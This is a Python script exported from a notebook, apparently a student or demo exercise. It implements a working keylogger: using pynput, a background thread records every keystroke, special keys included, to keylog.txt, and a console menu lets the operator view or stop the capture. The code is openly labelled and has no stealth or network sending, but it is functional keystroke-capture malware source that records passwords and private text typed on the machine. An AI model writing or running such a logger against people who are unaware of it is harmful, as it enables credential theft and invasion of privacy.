#!/usr/bin/env python
# coding: utf-8

# In[2]:


# This is a sample Python script.

# Press Shift+F10 to execute it or replace it with your code.
# Press Double Shift to search everywhere for classes, files, tool windows, actions, and settings.


def print_hi(name):
    # Use a breakpoint in the code line below to debug your script.
    print(f'Hi, {name}')  # Press Ctrl+F8 to toggle the breakpoint.

import threading
import time
from pynput.keyboard import Listener

# File to save keystrokes
log_file = "keylog.txt"
running = True  # Flag to control keylogger status
viewable_after_seconds = 10  # Time period after which logs can be viewed


def on_press(key):
    """
    Callback function triggered when a key is pressed.
    Logs the key press to the file.
    """
    try:
        # Log alphanumeric keys
        key_str = key.char
    except AttributeError:
        # Handle special keys like 'Space', 'Enter', etc.
        key_str = f"[{key}]"

    # Save the keystroke to the file
    with open(log_file, "a") as file:
        file.write(key_str)


def on_release(key):
    """
    Callback function triggered when a key is released.
    Stops the listener if the `running` flag is set to False.
    """
    if not running:
        return False


def keylogger():
    """
    Runs the keylogger listener.
    """
    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()


def start_keylogger():
    """
    Starts the keylogger in a separate thread.
    """
    global running
    running = True
    # Clear previous logs
    with open(log_file, "w") as file:
        file.write("")
    keylogger_thread = threading.Thread(target=keylogger, daemon=True)
    keylogger_thread.start()
    print("\nKeylogger started. You can begin typing...")


def stop_keylogger():
    """
    Stops the keylogger by changing the `running` flag.
    """
    global running
    running = False
    print("\nKeylogger stopped.")


def view_logs():
    """
    Displays the recorded keystrokes from the log file.
    """
    try:
        with open(log_file, "r") as file:
            logs = file.read()
        print("\n--- Recorded Keystrokes ---")
        print(logs if logs else "No keystrokes recorded.")
    except FileNotFoundError:
        print("No logs found. Start the keylogger to record keystrokes.")


def wait_and_allow_log_view():
    """
    Waits for a set period to allow the user to view the logs.
    """
    print(f"\nYou can view the recorded keystrokes in {viewable_after_seconds} seconds...")
    time.sleep(viewable_after_seconds)
    print("\nLogs are now viewable.")


def main():
    """
    The program starts logging automatically and allows the user to view logs or stop the keylogger at any time.
    """
    start_keylogger()

    # Start the timer for log access
    log_view_thread = threading.Thread(target=wait_and_allow_log_view, daemon=True)
    log_view_thread.start()

    while True:
        print("\nOptions:")
        print("1. View Recorded Keystrokes")
        print("2. Go Back to Typing (Continue Typing without Menu)")
        print("0. To Exit")

        # User can choose to see the menu or exit the program
        choice = input("Choose an option: ")

        if choice == "1":
            # View the recorded keystrokes
            view_logs()
        elif choice == "2":
            # Go back to typing mode without menu
            print("\nYou are now back to typing...")
            continue
        elif choice == "0":
            # Exit the program
            stop_keylogger()
            print("Exiting the program.")
            break
        else:
            print("Invalid option. Please try again.")


if __name__ == "__main__":
    main()


# In[ ]:




